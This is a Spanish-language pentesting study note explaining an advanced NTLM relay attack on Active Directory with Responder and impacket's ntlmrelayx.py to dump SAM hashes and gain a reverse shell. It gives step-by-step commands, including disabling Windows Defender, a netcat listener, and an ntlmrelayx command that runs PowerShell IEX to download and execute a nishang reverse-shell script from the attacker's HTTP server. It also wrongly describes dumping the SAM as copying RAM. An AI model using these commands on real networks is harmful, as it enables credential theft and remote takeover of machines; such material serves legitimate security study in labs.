
## Teoría

Decir "Avanzado" hace ver esto como  dificil, pero para nada, ya veras lo facil que es de entender, empecemos por diferenciar el basico por el avanzado, en el basico lo unico que haciamos era  capturar el NTLMv2 que nos llegaba, pero con este ataque podemos hacer algo mucho mas interesante, pero para practicar esto deberemos desactivar windows defender ya que nos puede chapar esta tecnica, pero bueno, vamos al grano, ¿de que consta esta otra tecnica?

En el NTLM Relay Attack avanzado lo que hacemos es lo mismo que en el basico, pero esta vez vamos a coger este NTLMv2 y lo usaremos para ejecutar comandos en una maquina sobre la cual el usuario y hash que nos haya llegado tengan privilegios, intentaré hacerme entender, imaginemos que existen 2 usuarios en un Active Directory, sin contar el administrador, estos dos usuarios son Juan y Silvia, pero Juan tiene privilegios sobre UN EQUIPO, en este caso, el equipo PC-Silvia , esto significa que juan puede ejecutar comandos en la maquina PC-Silvia, ya con esto entendido vamos a la maquina atacante:

- Supongamos que Juan quería buscar:

```java
smb:\\sqlserver\pass
```

- Pero terminó buscando:

```java
smb:\\sqlselver
```

- Como este recurso no existe, pues pasara lo que yo ya había explicado arriba, a nosotros que como atacantes tendremos el responder ejecutándose vamos a recibir el hash y la contraseña, pero esta vez tenemos otras herramientas ejecutándose, que nos permiten coger ese NTLMv2 que nos llega y redirigirlo a Silvia, haciéndonos pasar por juan, haciendo que ejecute un comando, y asi se tiene acceso a la maquina de Silvia

## Practica

Todo muy bonito y sobre el papel es muy simple, pero esta vez tendremos que hacer mas cosas que la vez pasada para empezar tenemos que desactivar las funcionalidades SMB y HTTP, ya que a pesar de que si queremos que se siga envenenando la red, ya no queremos que Responder reciba los NTLMv2, ahora esos los va a recibir la utilidad ntlmrelayx.py de la suite de impacket, esta utilidad hace el trabajo de redirigir ese NTLMv2 a la victima para que ejecute comandos, sin argumentos esta herramienta dumpea la SAM, lo cual explico a continuación:

 La SAM es el registro de contraseñas por defecto en Windows, por supuesto estas contraseñas están hasheadas, pero nos permitirán acceder a la maquina a nivel local, el termino dumpear hace referencia a la acción de hacer una "copia" al contenido de la RAM en cierto momento, esto nos permite ver binarios en texto claro, lo cual es extremadamente útil para robar credenciales.

Pero realmente podemos ejecutar nuestros propios comandos, a continuación hare un a explicación de como se realiza este ataque: 

- Primero configuramos el archivo Responder.conf para deshabilitar el uso de SMB y HTTP:

```bash
vim /usr/share/responder/Responder.conf

[Responder Core]
; Servers to start

SQL = On
SMB = On <---- Pasar este parametro a Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On <---- Pasar este parametro a Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
MQTT = On
```

Ahora que hemos hecho esa configuración, lo recomendable es hacer un [[Sondeo de equipos en el Active Directory]], y cuando sepamos las IP's de los equipos podemos representarlas todas o solo una en un archivo de objetivos, o si sabemos de algún usuario en el que otro equipo tenga privilegios podemos poner solo esa IP, por ejemplo, en el caso de que juan tiene privilegios sobre el PC de Silvia,  pondremos la IP del PC de Silvia.

después de hacer un archivo que lusca algo así: 

targets.txt
``` 
192.168.184.200
```


Ya teniendo este archivo, ejecutaremos Responder:

``` Ruby
sudo responder -I {Interfaz_de_red} -dwv 
```

Y ahora si podremos ejecutar ntlmrelayx.py: 

``` Ruby
ntlmrelayx.py -tf targets.txt -smb2support
```

Ahora solo tendremos que esperar, eventualmente obtendremos las SAM dumpeadas, si quieres saber que puedes hacer con la SAM dumpeada ve a [[2- Que Hacer con la SAM dumpeada]], pero no lo haremos aquí directamente ya que además de dumpear la SAM podemos optar por hacer algo aun mas interesante, ejecutar comandos y obtener una reverse shell...

# Obteniendo un reverse shell

## Teoría

Para esto haremos uso de un servidor que nosotros mismos vamos a montar en http con Python, hosteando un archivo malicioso que descargaremos por parte de la maquina Windows usando la vulnerabilidad RCE que vimos anteriormente para dumpear la SAM

## Practica

Lo primero que tenemos que hacer es usar nishang, un conjunto de scripts powersehll ofensivos para la penetración de Windows, ya cuando hayamos instalado este conjunto de scripts ofensivos, entraremos a la carpeta "Shells", allí encontraremos un archivo llamado Invoke-PowerShellTcp.ps1,
lo copiaremos y lo pegaremos en nuesstro entorno de trabajo, digamos en el escritorio:

``` Ruby
cp Invoke-PowerShellTcp.ps1 ~/Desktop/{nuevo nombre para el archivo malicioso}
```

Ahora, iremos al escritorio y editaremos este archivo, configurando la IP y el puerto al que se dirigirá esta reverse Shell, en este caso, a nuestra maquina atacante con el puerto de nuestra preferencia, yo usaré 4444 , para tener una referencia, en el script hay algunos EXAMPLES, que pues, valga la redundancia, son los ejemplos de  que debemos poner al final del script acorde a nuestras necesidades, en nuestro caso necesitamos una reverseshell, entonces usaremos el siguiente EXAMPLE:

![[SMB Relay 2.png]]

Esto lo tenemos que poner al final del archivo, de las siguiente manera:


![[SMB Relay 3.png]]

Ahora guardamos el archivo, ya con eso el archivo malicioso estaría listo, solo nos falta hostearlo, par eso usaremos un servidor http con python en el puerto de nuestra preferencia, siempre y cuando no sea el mismo que usaremos para recibir la reverseshell (4444), en mi caso usaré 8080, el siguiente comando tenemos que ejecutarlo en donde tengamos el archivo malicioso, en este caso, el escritorio:

``` Ruby
sudo python3 -m http.server 8080
```

Ahora tenemos que poner netcat a la espera  en el puerto que hayamos especificado en el archivo malicioso:

``` Ruby
nc -lvnp 4444
```

Ahora solo nos falta activar el Responder e indicarle a ntlmtrlayx el comando a ejecutar, el responder ya sabemos como activarlo, el ntlmrelayx lo configuraremos e la siguiente forma:

``` Ruby
ntlmrelayx.py -tf targets.txt -smb2suppport -c "powershell IEX(New-Object Net.WebClient).downloadString('http://{Nuestra IP de atracante}:{Puerto que especificamos en el codigo malicioso}/{nombre del archivo malicioso}')"
```

Esto nos debería conceder un acceso remoto al equipo. 
